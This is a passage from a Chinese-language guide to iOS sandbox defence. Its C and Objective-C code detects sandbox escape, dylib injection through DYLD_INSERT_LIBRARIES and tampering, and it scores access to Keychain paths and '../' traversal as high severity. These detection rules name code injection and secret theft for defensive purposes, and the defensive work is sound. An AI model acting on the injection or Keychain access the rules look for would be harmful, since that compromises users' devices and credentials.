        ipc_filter_callback  // 过滤回调
    );
    
    return 0;
}

// 3. 异常行为检测
typedef struct {
    uint64_t    syscall_count;      // 系统调用计数
    uint64_t    file_access_count;  // 文件访问计数
    uint64_t    network_count;      // 网络操作计数
    uint64_t    ipc_count;          // IPC操作计数
    uint32_t    anomaly_score;      // 异常分数
} process_behavior_t;

int detect_anomalous_behavior(pid_t pid) {
    process_behavior_t behavior = {0};
    
    // 收集进程行为统计
    collect_process_stats(pid, &behavior);
    
    // 计算异常分数
    if (behavior.file_access_count > NORMAL_FILE_ACCESS) {
        behavior.anomaly_score += 20;
    }
    if (behavior.ipc_count > NORMAL_IPC_COUNT) {
        behavior.anomaly_score += 30;
    }
    if (behavior.network_count > NORMAL_NETWORK_COUNT) {
        behavior.anomaly_score += 15;
    }
    
    // 超过阈值触发告警
    if (behavior.anomaly_score > ANOMALY_THRESHOLD) {
        log_security_event(pid, "anomalous_behavior", 
                          behavior.anomaly_score);
        return 1;
    }
    
    return 0;
}
```

### 14.2 沙箱逃逸检测

```c
// 沙箱逃逸检测技术

// 1. 检测异常的进程行为
int detect_sandbox_escape_attempt(void) {
    // 检查是否尝试访问沙箱外资源
    struct rlimit limits;
    getrlimit(RLIMIT_NOFILE, &limits);
    
    // 检查打开的文件描述符
    for (int fd = 0; fd < (int)limits.rlim_cur; fd++) {
        char path[PATH_MAX];
        if (fcntl(fd, F_GETPATH, path) >= 0) {
            // 检查路径是否在沙箱内
            if (!is_path_in_sandbox(path)) {
                printf("[!] 检测到沙箱外文件访问: fd=%d path=%s\n",
                       fd, path);
                return 1;
            }
        }
    }
    
    // 检查Mach端口
    mach_port_name_t *ports;
    mach_msg_type_number_t port_count;
    
    task_ports(mach_task_self(), &ports, &port_count);
    
    for (mach_msg_type_number_t i = 0; i < port_count; i++) {
        // 检查是否有异常的端口
        if (is_unexpected_port(ports[i])) {
            printf("[!] 检测到异常Mach端口: %d\n", ports[i]);
            return 1;
        }
    }
    
    return 0;
}

// 2. 检测代码注入
int detect_code_injection(void) {
    // 检查已加载的动态库
    uint32_t image_count = _dyld_image_count();
    
    for (uint32_t i = 0; i < image_count; i++) {
        const char *name = _dyld_get_image_name(i);
        
        // 检查是否有非预期的动态库
        if (!is_approved_dylib(name)) {
            printf("[!] 检测到可疑动态库: %s\n", name);
            return 1;
        }
    }
    
    // 检查环境变量
    const char *insert_libs = getenv("DYLD_INSERT_LIBRARIES");
    if (insert_libs) {
        printf("[!] 检测到DYLD_INSERT_LIBRARIES: %s\n", insert_libs);
        return 1;
    }
    
    return 0;
}

// 3. 运行时完整性检查
int runtime_integrity_check(void) {
    // 验证关键函数的完整性
    void *sandbox_check_addr = (void *)sandbox_check;
    
    // 计算函数哈希
    uint8_t hash[32];
    compute_sha256(sandbox_check_addr, FUNCTION_SIZE, hash);
    
    // 与预期哈希比较
    if (memcmp(hash, expected_hash, 32) != 0) {
        printf("[!] 检测到函数篡改!\n");
        return 1;
    }
    
    // 检查内存页权限
    // 代码页应该是只读+可执行
    vm_address_t page = (vm_address_t)sandbox_check_addr & ~0xFFF;
    vm_prot_t cur_prot, max_prot;
    
    kern_return_t kr = mach_vm_region(
        mach_task_self(), &page,
        &(vm_size_t){0x1000},
        VM_REGION_BASIC_INFO_64,
        (vm_region_info_t)&(vm_region_basic_info_data_t){0},
        &(mach_msg_type_number_t){VM_REGION_BASIC_INFO_COUNT_64},
        &(mach_port_t){0}, &cur_prot, &max_prot);
    
    if (kr == KERN_SUCCESS) {
        if (cur_prot & VM_PROT_WRITE) {
            printf("[!] 代码页可写 - 可能被篡改!\n");
            return 1;
        }
    }
    
    return 0;
}
```

### 14.3 安全监控实现

```objc
// iOS安全监控框架
// 实时监控沙箱逃逸尝试

#import <Foundation/Foundation.h>

@interface SecurityMonitor : NSObject

@property (nonatomic, assign) BOOL isMonitoring;
@property (nonatomic, strong) NSMutableArray *securityEvents;

- (void)startMonitoring;
- (void)stopMonitoring;
- (void)handleSecurityEvent:(NSDictionary *)event;

@end

@implementation SecurityMonitor

- (void)startMonitoring {
    self.isMonitoring = YES;
    self.securityEvents = [NSMutableArray array];
    
    // 监控文件系统操作
    [self monitorFileSystem];
    
    // 监控网络活动
    [self monitorNetwork];
    
    // 监控进程创建
    [self monitorProcessCreation];
    
    // 监控Mach端口操作
    [self monitorMachPorts];
    
    NSLog(@"[+] 安全监控已启动");
}

- (void)monitorFileSystem {
    // 使用FSEvents监控文件系统
    FSEventStreamRef stream = FSEventStreamCreate(
        NULL,
        ^(ConstFSEventStreamRef ref, void *info,
          size_t count, void *paths,
          const FSEventStreamEventFlags flags[],
          const FSEventStreamEventId ids[]) {
            
            const char **pathArray = (const char **)paths;
            for (size_t i = 0; i < count; i++) {
                NSString *path = @(pathArray[i]);
                
                // 检查是否访问敏感路径
                if ([self isSensitivePath:path]) {
                    [self handleSecurityEvent:@{
                        @"type": @"filesystem",
                        @"path": path,
                        @"flags": @(flags[i]),
                        @"timestamp": @([[NSDate date] timeIntervalSince1970]),
                    }];
                }
            }
        },
        NULL,
        (__bridge CFArrayRef)@[@"/private/var/mobile/"],
        kFSEventStreamEventIdSinceNow,
        0.5,
        kFSEventStreamCreateFlagFileEvents);
    
    FSEventStreamScheduleWithRunLoop(stream,
        CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    FSEventStreamStart(stream);
}

- (void)monitorNetwork {
    // 监控网络连接
    // 使用nw_path_monitor等API
    dispatch_queue_t queue = dispatch_queue_create(
        "com.security.network", DISPATCH_QUEUE_SERIAL);
    
    // 定期检查活跃连接
    dispatch_source_t timer = dispatch_source_create(
        DISPATCH_SOURCE_TYPE_TIMER, 0, 0, queue);
    
    dispatch_source_set_timer(timer,
        dispatch_time(DISPATCH_TIME_NOW, 0),
        5 * NSEC_PER_SEC, NSEC_PER_SEC);
    
    dispatch_source_set_event_handler(timer, ^{
        [self checkActiveConnections];
    });
    
    dispatch_resume(timer);
}

- (void)handleSecurityEvent:(NSDictionary *)event {
    [self.securityEvents addObject:event];
    
    // 分析事件严重性
    NSString *type = event[@"type"];
    uint32_t severity = [self calculateSeverity:event];
    
    if (severity >= 7) {
        // 高严重性事件 - 立即告警
        NSLog(@"[!] 高严重性安全事件: %@ (severity=%u)", 
              type, severity);
        
        // 发送远程告警
        [self sendRemoteAlert:event];
    }
    
    // 累积事件分析
    if (self.securityEvents.count > 100) {
        [self analyzeEventPattern];
    }
}

- (uint32_t)calculateSeverity:(NSDictionary *)event {
    uint32_t severity = 0;
    
    NSString *type = event[@"type"];
    
    if ([type isEqualToString:@"filesystem"]) {
        NSString *path = event[@"path"];
        if ([path containsString:@"Keychain"]) severity += 8;
        if ([path containsString:@"Library/Preferences"]) severity += 5;
        if ([path containsString:@"../"]) severity += 7;
    }
    
    if ([type isEqualToString:@"mach_port"]) {
        severity += 6;
    }
    
    if ([type isEqualToString:@"process"]) {
        severity += 7;
    }
    
    return MIN(severity, 10);
}

@end
```

---

## 15. 未来防御趋势

### 15.1 下一代沙箱技术

```
未来沙箱防御演进:

├── 微隔离 (Micro-segmentation)
│   ├── 每个功能模块独立沙箱
│   ├── 动态权限分配
│   └── 零信任架构
│
├── 行为分析 (Behavioral Analysis)
│   ├── 机器学习异常检测
│   ├── 实时行为画像
│   └── 预测性防御
│
├── 硬件增强 (Hardware Enhancement)
│   ├── 内存标签扩展 (MTE)
│   ├── 更细粒度的权限控制
│   └── 硬件级隔离
│
└── 形式化验证 (Formal Verification)
    ├── 沙箱策略数学证明
    ├── 自动化漏洞发现
    └── 安全属性保证
```

### 15.2 防御技术对比

| 防御技术 | 有效性 | 性能开销 | 部署难度 |
|---------|--------|---------|---------|
| 传统沙箱 | 中 | 低 | 低 |
| MAC策略增强 | 高 | 中 | 中 |
| 行为监控 | 高 | 高 | 高 |
| 硬件隔离 | 极高 | 低 | 极高 |
| 形式化验证 | 极高 | 无 | 极高 |

---

> 联系: telegram：@pengqing666
